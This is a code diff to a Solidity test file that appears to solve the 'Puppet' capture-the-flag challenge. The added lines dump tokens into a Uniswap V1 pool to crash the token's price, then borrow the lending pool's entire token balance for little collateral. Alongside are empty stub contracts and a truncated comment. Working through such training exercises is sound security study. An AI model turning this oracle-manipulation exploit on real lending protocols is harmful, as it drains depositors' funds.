@@ -93,6 +93,13 @@ contract PuppetChallenge is Test {
      */
     function test_puppet() public checkSolvedByPlayer {
         
+        // Only one transaction, will send all the funds to the 
+        // Buy most of the ETH pool using my 1000 DVT
+        token.approve(address(uniswapV1Exchange), 1000e18);
+        uniswapV1Exchange.tokenToEthSwapInput(1000e18, 9e18, block.timestamp * 4);
+        lendingPool.borrow{value: 20e18}(100_000e18, recovery);
+        //console.log("Balance eth of exchange: ", address(uniswapV1Exchange).balance);
+
     }
 
     // Utility function to calculate Uniswap prices
@@ -116,3 +123,15 @@ contract PuppetChallenge is Test {
         assertGe(token.balanceOf(recovery), POOL_INITIAL_TOKEN_BALANCE, "Not enough tokens in recovery account");
     }
 }
+
+
+contract Atacker {
+    constructor(){}
+
+    function attack() public {}
+
+    receive() external payable {}
+}
+
+
+contract PermitContract is Test {}
